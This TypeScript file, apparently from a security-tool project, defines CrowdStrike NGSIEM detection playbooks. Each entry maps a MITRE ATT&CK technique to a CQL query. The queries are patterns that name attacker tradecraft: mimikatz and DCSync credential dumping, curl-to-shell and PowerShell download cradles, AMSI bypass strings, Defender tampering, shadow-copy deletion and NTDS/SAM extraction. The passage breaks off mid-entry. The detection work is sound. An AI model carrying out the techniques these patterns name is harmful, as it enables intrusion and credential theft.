// Curated NGSIEM playbooks. Sources credited per playbook.
// Most queries originate from CQL Hub (https://www.byteray.com/cql-hub, source at
// https://github.com/ByteRay-Labs/Query-Hub),
// itself a community-curated index of CrowdStrike Falcon LogScale + NGSIEM queries.
// Some are abridged for demo readability; full versions linked in `source`.

export type PlaybookOs = "win" | "mac" | "lin";

export const OS_LABEL: Record<PlaybookOs, string> = {
  win: "Windows",
  mac: "macOS",
  lin: "Linux",
};

export type PlaybookCategory =
  | "initial-access"
  | "credential-access"
  | "execution"
  | "persistence"
  | "privilege-escalation"
  | "lateral-movement"
  | "defense-evasion"
  | "discovery"
  | "command-and-control"
  | "impact"
  | "shadow-ai"
  | "supply-chain";

export type NgsiemPlaybook = {
  id: string;
  title: string;
  description: string;
  mitre: string[];
  category: PlaybookCategory;
  /** Which OS platform(s) the query targets — drives the badges in the UI. */
  os: PlaybookOs[];
  repository:
    | "search-all"
    | "investigate_view"
    | "third-party"
    | "falcon_for_it_view"
    | "forensics_view";
  /** Time window in hours; the API will pass an ISO `start` derived from now. */
  windowHours: number;
  cql: string;
  source: string;
  author: string;
};

export const CATEGORY_LABEL: Record<PlaybookCategory, string> = {
  "initial-access": "Initial Access",
  "credential-access": "Credential Access",
  execution: "Execution",
  persistence: "Persistence",
  "privilege-escalation": "Privilege Escalation",
  "lateral-movement": "Lateral Movement",
  "defense-evasion": "Defense Evasion",
  discovery: "Discovery",
  "command-and-control": "Command & Control",
  impact: "Impact",
  "shadow-ai": "Shadow AI",
  "supply-chain": "Supply Chain",
};

export const PLAYBOOKS: NgsiemPlaybook[] = [
  {
    id: "credential-dumping",
    title: "Credential Dumping Detection",
    description:
      "Detect potential LSASS access and credential-dumping tooling (mimikatz, procdump, pwdump).",
    mitre: ["T1003.001", "T1003.002", "T1558.003"],
    category: "credential-access",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2
| (CommandLine=/mimikatz|procdump|lsass|sekurlsa/i OR ImageFileName=/\\\\(mimikatz|procdump|pwdump)\\.exe$/i)
| ParentImageFileName!=/\\\\(powershell|cmd)\\.exe$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://github.com/ByteRay-Labs/Query-Hub/blob/main/queries/Credential_Dumping_Detection.yml",
    author: "ByteRay GmbH",
  },
  {
    id: "base64-powershell",
    title: "Base64-encoded PowerShell Commands",
    description:
      "Find PowerShell executions using -EncodedCommand and surface the decoded payload for review.",
    mitre: ["T1059.001", "T1027"],
    category: "execution",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win ImageFileName=/.*\\\\powershell\\.exe/
| CommandLine=/\\s+\\-(e|encoded|encodedcommand|enc)\\s+/i
| EncodedString := splitString(field=CommandLine, by="-e* ", index=1)
| DecodedString := base64Decode(EncodedString, charset="UTF-16LE")
| table([ComputerName, UserName, DecodedString, CommandLine])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://github.com/ByteRay-Labs/Query-Hub/blob/main/queries/Detect_and_Decode_Base64-Encoded_PowerShell_Commands.yml",
    author: "CrowdStrike",
  },
  {
    id: "lateral-movement",
    title: "Lateral Movement (SMB / RDP / WinRM)",
    description:
      "Outbound connections to remote-admin ports (445, 3389, 5985) bound for non-RFC1918 addresses.",
    mitre: ["T1021.001", "T1021.002", "T1135"],
    category: "lateral-movement",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=NetworkConnect
| (RemotePort=445 OR RemotePort=3389 OR RemotePort=5985)
| !cidr(RemoteAddressIP4, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"])
| join({#event_simpleName=ProcessRollup2}, field=[aid, RawProcessId], include=[ImageFileName, CommandLine])
| table([ComputerName, UserName, ImageFileName, RemoteAddressIP4, RemotePort, CommandLine])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://github.com/ByteRay-Labs/Query-Hub/blob/main/queries/Lateral_Movement_Detection.yml",
    author: "ByteRay GmbH",
  },
  {
    id: "system-utilities",
    title: "Suspicious Windows System Utilities",
    description:
      "Surface unusual use of administrative tools (net, sc, nltest, systeminfo) often abused for discovery.",
    mitre: ["T1059.003", "T1018", "T1082"],
    category: "discovery",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\(net|net1|sc|nltest|systeminfo|whoami|tasklist|ipconfig|nbtstat|arp)\\.exe$/i
| ParentImageFileName!=/\\\\(explorer|services|svchost)\\.exe$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://github.com/ByteRay-Labs/Query-Hub/blob/main/queries/Detect_Suspicious_Windows_Command-Line_Activity_Using_System_Utilities.yml",
    author: "CrowdStrike",
  },
  {
    id: "lolbin-certutil",
    title: "LOLBin: Certutil download / decode",
    description:
      "Detect certutil.exe used to download remote files or decode base64 payloads — classic LOLBin abuse.",
    mitre: ["T1218", "T1140", "T1105"],
    category: "defense-evasion",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\certutil\\.exe$/i
| CommandLine=/(-urlcache|-decode|-decodehex|-encode|-split|-f\\s+http)/i
| table([ComputerName, UserName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://github.com/ByteRay-Labs/Query-Hub/blob/main/queries/LOLBin_Certutil.yml",
    author: "ByteRay GmbH",
  },
  {
    id: "external-ip-cmdline",
    title: "Direct IP Address in Command Line",
    description:
      "Find process executions with a hard-coded public IP in the command line — common C2 indicator.",
    mitre: ["T1071", "T1571"],
    category: "command-and-control",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2
| CommandLine=/\\b(?!10\\.|172\\.(1[6-9]|2[0-9]|3[0-1])\\.|192\\.168\\.|127\\.|169\\.254\\.)(\\d{1,3}\\.){3}\\d{1,3}\\b/
| table([ComputerName, UserName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://github.com/ByteRay-Labs/Query-Hub/blob/main/queries/Detection_of_External_Direct_IP_Usage_in_CommandLine_Windows_and_Mac.yml",
    author: "ByteRay GmbH",
  },
  {
    id: "failed-logon-threshold",
    title: "Failed Logon Threshold (brute-force)",
    description:
      "Hosts with 10+ failed authentication events in the last 24 hours — possible brute-force or password-spray.",
    mitre: ["T1110", "T1078"],
    category: "credential-access",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=UserLogonFailed2
| groupBy([ComputerName, UserName], function=count(as="failed_logons"))
| failed_logons >= 10
| sort(failed_logons, order=desc)
| head(50)`,
    source:
      "https://github.com/ByteRay-Labs/Query-Hub/blob/main/queries/Failed_User_Logon_Thresholding.yml",
    author: "ByteRay GmbH",
  },
  {
    id: "honey-token",
    title: "Honey-Token Account Logon",
    description:
      "Any login by a designated honey-token user account is intrinsically suspicious.",
    mitre: ["T1078"],
    category: "credential-access",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=UserLogon
| UserName=/(honey|trap|canary|decoy|svc-honey)/i
| table([ComputerName, UserName, LogonType, LogonTime])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://github.com/ByteRay-Labs/Query-Hub/blob/main/queries/Honey_Token_Account_Logon.yml",
    author: "ByteRay GmbH",
  },
  {
    id: "office-spawns-shell",
    title: "Office app spawning shell / scripting host",
    description:
      "Word, Excel, PowerPoint, or Outlook spawning cmd.exe, powershell.exe, wscript, cscript, or mshta — classic phishing-payload execution.",
    mitre: ["T1566.001", "T1059.001", "T1059.005"],
    category: "initial-access",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ParentImageFileName=/\\\\(winword|excel|powerpnt|outlook|onenote)\\.exe$/i
| ImageFileName=/\\\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32)\\.exe$/i
| table([ComputerName, UserName, ParentImageFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://attack.mitre.org/techniques/T1566/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "scheduled-task-create",
    title: "Scheduled task created (persistence)",
    description:
      "schtasks.exe /create or PowerShell New-ScheduledTask invocations — common persistence and lateral execution mechanism.",
    mitre: ["T1053.005"],
    category: "persistence",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (ImageFileName=/\\\\schtasks\\.exe$/i AND CommandLine=/\\s\\/create\\b/i)
  OR (ImageFileName=/\\\\(powershell|pwsh)\\.exe$/i AND CommandLine=/(New-ScheduledTask|Register-ScheduledTask)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://attack.mitre.org/techniques/T1053/005/",
    author: "Curated for Project Eyas",
  },
  {
    id: "service-install",
    title: "Service installed for persistence",
    description:
      "sc.exe create or New-Service invocations creating new Windows services — used for persistence and SYSTEM-level execution (e.g. PsExec).",
    mitre: ["T1543.003"],
    category: "persistence",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (ImageFileName=/\\\\sc\\.exe$/i AND CommandLine=/\\s(create|config)\\b/i)
  OR (ImageFileName=/\\\\(powershell|pwsh)\\.exe$/i AND CommandLine=/New-Service/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://attack.mitre.org/techniques/T1543/003/",
    author: "Curated for Project Eyas",
  },
  {
    id: "wmic-remote-exec",
    title: "WMIC remote process execution",
    description:
      "wmic.exe with /node: and 'process call create' — remote code execution via WMI, a hallmark of lateral movement.",
    mitre: ["T1047"],
    category: "lateral-movement",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\wmic\\.exe$/i
| CommandLine=/\\/node:.*process\\s+call\\s+create/i
| table([ComputerName, UserName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://attack.mitre.org/techniques/T1047/",
    author: "Curated for Project Eyas",
  },
  {
    id: "defender-tampering",
    title: "Defender / security tooling tampering",
    description:
      "Attempts to disable Windows Defender real-time protection, stop AV services, or add broad exclusions — frequent precursor to payload execution.",
    mitre: ["T1562.001"],
    category: "defense-evasion",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (CommandLine=/Set-MpPreference.*-Disable(RealtimeMonitoring|IntrusionPreventionSystem|ScriptScanning|BehaviorMonitoring)/i)
  OR (CommandLine=/Add-MpPreference.*-ExclusionPath/i)
  OR (ImageFileName=/\\\\sc\\.exe$/i AND CommandLine=/\\s(stop|delete|config).*(WinDefend|Sense|MsSense|MsMpSvc)/i)
  OR (ImageFileName=/\\\\net(1)?\\.exe$/i AND CommandLine=/\\sstop\\s+(WinDefend|MsMpSvc)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://attack.mitre.org/techniques/T1562/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "shadow-copy-deletion",
    title: "Shadow copy / backup deletion (ransomware)",
    description:
      "vssadmin delete shadows, wmic shadowcopy delete, wbadmin delete catalog, bcdedit recovery tampering — high-confidence ransomware pre-encryption signal.",
    mitre: ["T1490"],
    category: "impact",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (ImageFileName=/\\\\vssadmin\\.exe$/i AND CommandLine=/delete\\s+shadows/i)
  OR (ImageFileName=/\\\\wmic\\.exe$/i AND CommandLine=/shadowcopy.*delete/i)
  OR (ImageFileName=/\\\\wbadmin\\.exe$/i AND CommandLine=/delete\\s+(catalog|systemstatebackup|backup)/i)
  OR (ImageFileName=/\\\\bcdedit\\.exe$/i AND CommandLine=/(recoveryenabled\\s+no|bootstatuspolicy\\s+ignoreallfailures)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://attack.mitre.org/techniques/T1490/",
    author: "Curated for Project Eyas",
  },
  {
    id: "linux-curl-pipe-shell",
    title: "curl/wget piped into shell (Linux)",
    description:
      "Detect `curl … | bash` / `wget -O- | sh` patterns — a hallmark of Linux malware droppers and one-liner installers.",
    mitre: ["T1059.004", "T1105"],
    category: "execution",
    os: ["lin"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Lin
| CommandLine=/(curl|wget)\\b[^|]*\\|\\s*(bash|sh|zsh|python|perl)\\b/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://attack.mitre.org/techniques/T1059/004/",
    author: "Curated for Project Eyas",
  },
  {
    id: "linux-authorized-keys",
    title: "SSH authorized_keys modification (Linux)",
    description:
      "Writes or appends to ~/.ssh/authorized_keys outside of normal admin tooling — a classic Linux backdoor persistence technique.",
    mitre: ["T1098.004", "T1136"],
    category: "persistence",
    os: ["lin"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Lin
| (CommandLine=/(\\.ssh\\/authorized_keys)/i)
| (ImageFileName=/\\/(echo|tee|cat|cp|mv|sed|printf|bash|sh|python|perl)$/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://attack.mitre.org/techniques/T1098/004/",
    author: "Curated for Project Eyas",
  },
  {
    id: "macos-launchagent",
    title: "LaunchAgent / LaunchDaemon plist created (macOS)",
    description:
      "New plist files written under /Library/LaunchAgents, /Library/LaunchDaemons, or ~/Library/LaunchAgents — the most common macOS persistence mechanism.",
    mitre: ["T1543.001", "T1543.004"],
    category: "persistence",
    os: ["mac"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Mac
| CommandLine=/(\\/Library\\/(Launch(Agents|Daemons))|Library\\/LaunchAgents)\\/.+\\.plist/i
| ImageFileName=/\\/(cp|mv|tee|launchctl|plutil|defaults|bash|sh|zsh|python)$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://attack.mitre.org/techniques/T1543/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "macos-osascript-suspicious",
    title: "Suspicious osascript / curl-to-shell (macOS)",
    description:
      "osascript executing inline AppleScript with shell-out, or curl/wget piped to a shell on macOS — common in macOS stealer / installer payloads.",
    mitre: ["T1059.002", "T1105"],
    category: "execution",
    os: ["mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Mac
| (ImageFileName=/\\/osascript$/i AND CommandLine=/(do shell script|-e\\s)/i)
  OR (CommandLine=/(curl|wget)\\b[^|]*\\|\\s*(bash|sh|zsh|python|perl)\\b/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://attack.mitre.org/techniques/T1059/002/",
    author: "Curated for Project Eyas",
  },
  {
    id: "event-log-clear",
    title: "Windows event log cleared",
    description:
      "wevtutil cl or PowerShell Clear-EventLog — attackers wiping forensic evidence after intrusion.",
    mitre: ["T1070.001"],
    category: "defense-evasion",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (ImageFileName=/\\\\wevtutil\\.exe$/i AND CommandLine=/\\s(cl|clear-log)\\b/i)
  OR (ImageFileName=/\\\\(powershell|pwsh)\\.exe$/i AND CommandLine=/Clear-EventLog/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source:
      "https://attack.mitre.org/techniques/T1070/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "iso-img-mount",
    title: "ISO / IMG / VHD container mount",
    description:
      "ISO, IMG, and VHD containers bypass Mark-of-the-Web — a now-dominant phishing-payload delivery technique (Qakbot, IcedID, Bumblebee).",
    mitre: ["T1566.001", "T1553.005"],
    category: "initial-access",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (CommandLine=/\\.(iso|img|vhd|vhdx)\\b/i)
  OR (ImageFileName=/\\\\(powershell|pwsh)\\.exe$/i AND CommandLine=/Mount-DiskImage/i)
| ParentImageFileName=/\\\\(explorer|outlook|chrome|firefox|msedge)\\.exe$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1553/005/",
    author: "Curated for Project Eyas",
  },
  {
    id: "onenote-payload",
    title: "OneNote spawning script / shell host",
    description:
      "onenote.exe → wscript / cscript / cmd / powershell — OneNote-embedded payload execution (post-2023 phishing wave).",
    mitre: ["T1566.001"],
    category: "initial-access",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ParentImageFileName=/\\\\onenote\\.exe$/i
| ImageFileName=/\\\\(wscript|cscript|cmd|powershell|pwsh|mshta|hh|rundll32)\\.exe$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1566/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "lnk-from-archive",
    title: "LNK launched from archive / temp / Downloads",
    description:
      "Shortcut files executed from extraction-typical paths — LNK-based phishing payload pattern (e.g. Emotet, Qakbot).",
    mitre: ["T1204.002", "T1547.009"],
    category: "initial-access",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| CommandLine=/\\.(lnk)\\b/i
| (CommandLine=/(\\\\AppData\\\\Local\\\\Temp|\\\\Downloads|\\\\Temp\\\\7z|\\\\Temp\\\\Rar)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1204/002/",
    author: "Curated for Project Eyas",
  },
  {
    id: "rundll32-suspicious",
    title: "rundll32 with remote / suspicious DLL",
    description:
      "rundll32.exe loading DLLs from temp/AppData, calling javascript:, or hosting URLs — proxied execution and C2 stagers.",
    mitre: ["T1218.011"],
    category: "execution",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\rundll32\\.exe$/i
| (CommandLine=/(javascript:|http[s]?:\\/\\/|\\\\AppData\\\\|\\\\Temp\\\\|\\.dll,\\s*[A-Za-z]{1,4}\\s*$)/i)
| table([ComputerName, UserName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1218/011/",
    author: "Curated for Project Eyas",
  },
  {
    id: "regsvr32-scrobj",
    title: "regsvr32 squiblydoo (scrobj.dll / remote SCT)",
    description:
      "regsvr32.exe with /i:http and scrobj.dll — the canonical squiblydoo proxied-execution / AppLocker bypass.",
    mitre: ["T1218.010"],
    category: "defense-evasion",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\regsvr32\\.exe$/i
| (CommandLine=/\\/i:http/i OR CommandLine=/scrobj\\.dll/i OR CommandLine=/\\/u\\s+\\/s\\s+\\/i:/i)
| table([ComputerName, UserName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1218/010/",
    author: "Curated for Project Eyas",
  },
  {
    id: "mshta-remote",
    title: "mshta loading remote HTA / inline script",
    description:
      "mshta.exe fetching URLs or executing inline javascript:/vbscript: — proxied execution via MS HTML application host.",
    mitre: ["T1218.005"],
    category: "execution",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\mshta\\.exe$/i
| CommandLine=/(http[s]?:\\/\\/|javascript:|vbscript:)/i
| table([ComputerName, UserName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1218/005/",
    author: "Curated for Project Eyas",
  },
  {
    id: "bitsadmin-transfer",
    title: "bitsadmin / BITS job remote download",
    description:
      "bitsadmin /transfer or PowerShell Start-BitsTransfer pulling content from the internet — covert download channel that survives reboots.",
    mitre: ["T1197", "T1105"],
    category: "command-and-control",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (ImageFileName=/\\\\bitsadmin\\.exe$/i AND CommandLine=/\\/transfer/i)
  OR (ImageFileName=/\\\\(powershell|pwsh)\\.exe$/i AND CommandLine=/Start-BitsTransfer/i)
| table([ComputerName, UserName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1197/",
    author: "Curated for Project Eyas",
  },
  {
    id: "powershell-iex-download",
    title: "PowerShell Invoke-Expression download cradle",
    description:
      "Classic IEX (New-Object Net.WebClient).DownloadString / Invoke-WebRequest piped to IEX — fileless PowerShell stagers.",
    mitre: ["T1059.001", "T1105"],
    category: "execution",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\(powershell|pwsh)\\.exe$/i
| (CommandLine=/(IEX|Invoke-Expression).*?(DownloadString|Invoke-WebRequest|wget|curl|Net\\.WebClient)/i)
  OR (CommandLine=/DownloadString\\s*\\(/i)
| table([ComputerName, UserName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1059/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "amsi-bypass",
    title: "AMSI / ETW bypass strings in PowerShell",
    description:
      "PowerShell command lines containing AmsiUtils, AmsiInitFailed, or amsi.dll patches — Defender AMSI-bypass tradecraft.",
    mitre: ["T1562.001"],
    category: "defense-evasion",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\(powershell|pwsh)\\.exe$/i
| (CommandLine=/(amsiInitFailed|AmsiUtils|amsiContext|EtwEventWrite|System\\.Management\\.Automation\\.Amsi)/i)
| table([ComputerName, UserName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1562/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "fodhelper-uac-bypass",
    title: "fodhelper / computerdefaults UAC bypass",
    description:
      "fodhelper.exe or computerdefaults.exe spawning a non-MS child — the registry-hijack UAC bypass against autoElevate-trusted binaries.",
    mitre: ["T1548.002"],
    category: "defense-evasion",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ParentImageFileName=/\\\\(fodhelper|computerdefaults|sdclt|eventvwr|slui)\\.exe$/i
| ImageFileName=/\\\\(powershell|pwsh|cmd|wscript|cscript|mshta|rundll32|regsvr32)\\.exe$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1548/002/",
    author: "Curated for Project Eyas",
  },
  {
    id: "motw-removal",
    title: "Mark-of-the-Web removal (Unblock-File / Zone.Identifier)",
    description:
      "Powershell Unblock-File or alternate-data-stream wipes against :Zone.Identifier — strips MotW so executables can run unprompted.",
    mitre: ["T1553.005"],
    category: "defense-evasion",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (CommandLine=/Unblock-File/i)
  OR (CommandLine=/:Zone\\.Identifier/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1553/005/",
    author: "Curated for Project Eyas",
  },
  {
    id: "registry-run-key",
    title: "Registry Run / RunOnce key write",
    description:
      "Direct writes to HKCU/HKLM Run / RunOnce / Winlogon keys — top-five Windows persistence path used by every commodity loader.",
    mitre: ["T1547.001"],
    category: "persistence",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\(reg|powershell|pwsh)\\.exe$/i
| (CommandLine=/(CurrentVersion\\\\(Run|RunOnce|RunServices|Winlogon)|Set-ItemProperty.*Run)/i)
| (CommandLine=/(add|Set-ItemProperty|New-ItemProperty)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1547/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "wmi-event-subscription",
    title: "WMI event subscription persistence",
    description:
      "wmic ActiveScriptEventConsumer / EventFilter / FilterToConsumerBinding — fileless WMI persistence used by APTs and ransomware affiliates.",
    mitre: ["T1546.003"],
    category: "persistence",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (CommandLine=/(ActiveScriptEventConsumer|CommandLineEventConsumer|__EventFilter|FilterToConsumerBinding)/i)
  OR (ImageFileName=/\\\\(powershell|pwsh)\\.exe$/i AND CommandLine=/Set-WmiInstance.*__EventFilter/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1546/003/",
    author: "Curated for Project Eyas",
  },
  {
    id: "startup-folder-drop",
    title: "File dropped into Startup folder",
    description:
      "New file written under \\Start Menu\\Programs\\Startup — runs at every logon. Cheap and noisy persistence still common in commodity malware.",
    mitre: ["T1547.001"],
    category: "persistence",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (CommandLine=/(\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\)/i)
| ImageFileName=/\\\\(powershell|pwsh|cmd|wscript|cscript|copy|xcopy|robocopy|move)\\.exe$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1547/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "image-file-execution-options",
    title: "Image File Execution Options debugger hijack",
    description:
      "Writes to HKLM IFEO\\<exe>\\Debugger to hijack a binary (sticky-keys / utilman trick, accessibility bypass).",
    mitre: ["T1546.012"],
    category: "persistence",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (CommandLine=/Image File Execution Options.*Debugger/i)
| ImageFileName=/\\\\(reg|powershell|pwsh)\\.exe$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1546/012/",
    author: "Curated for Project Eyas",
  },
  {
    id: "dcsync",
    title: "DCSync / NTLM hash replication",
    description:
      "DRSGetNCChanges-style command-line patterns (mimikatz lsadump::dcsync, Invoke-DCSync) — domain-credential replication abuse.",
    mitre: ["T1003.006"],
    category: "credential-access",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (CommandLine=/(lsadump::dcsync|Invoke-DCSync|dcsync\\s+\\/user|DSReplicaGetInfo|GetNCChanges)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1003/006/",
    author: "Curated for Project Eyas",
  },
  {
    id: "ntds-extract",
    title: "NTDS.dit / SAM hive extraction",
    description:
      "ntdsutil ifm, vssadmin create + copy of NTDS.dit, or reg save HKLM\\SAM — domain-controller credential exfil.",
    mitre: ["T1003.003", "T1003.002"],
    category: "credential-access",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (ImageFileName=/\\\\ntdsutil\\.exe$/i AND CommandLine=/(ifm|create full)/i)
  OR (ImageFileName=/\\\\reg\\.exe$/i AND CommandLine=/save\\s+HK(LM|EY_LOCAL_MACHINE)\\\\(SAM|SYSTEM|SECURITY)/i)
  OR (CommandLine=/(NTDS\\.dit|\\\\SYSVOL\\\\.*\\.xml)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
